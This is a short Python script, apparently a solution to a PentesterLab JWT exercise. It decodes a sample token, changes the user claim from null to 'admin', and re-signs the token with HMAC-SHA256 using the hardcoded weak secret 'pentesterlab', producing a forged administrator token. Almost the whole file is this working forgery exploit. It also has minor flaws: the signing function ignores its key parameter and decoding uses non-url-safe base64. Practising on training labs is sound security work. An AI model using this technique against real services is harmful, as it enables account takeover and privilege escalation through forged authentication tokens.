import hmac
import hashlib
import base64
import binascii

def padding(part):
    if len(part) % 4 != 0:
        padding = 4- (len(part) % 4)
        return part + ("="*padding)
    return part

def sign(part, key):
    return base64.urlsafe_b64encode(hmac.new("pentesterlab".encode(), part.encode(), hashlib.sha256).digest()).decode("utf-8").rstrip("=")

def createJWT(jwt):
    body = jwt[1]
    header = jwt[0]
    print(body)
    print(header)
    #header = header.replace
    body = body.replace("null", "\"admin\"")
    print(body)
    print(header)
    payload = base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=") + "." + base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=")
    signature =  sign(payload, key)
    return base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=") + "." + base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=") + "." + signature

def decode(jwt):
    particles = jwt.split(".")
    header = base64.b64decode(padding(particles[0])).decode("utf-8")
    body = base64.b64decode(padding(particles[1])).decode("utf-8")
    return header +"." + body

key = "pentesterlab"
orig_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
particles = orig_jwt.split(".")

print("---------")
signature = createJWT(decode(orig_jwt).split("."))
print(signature)
print("---------")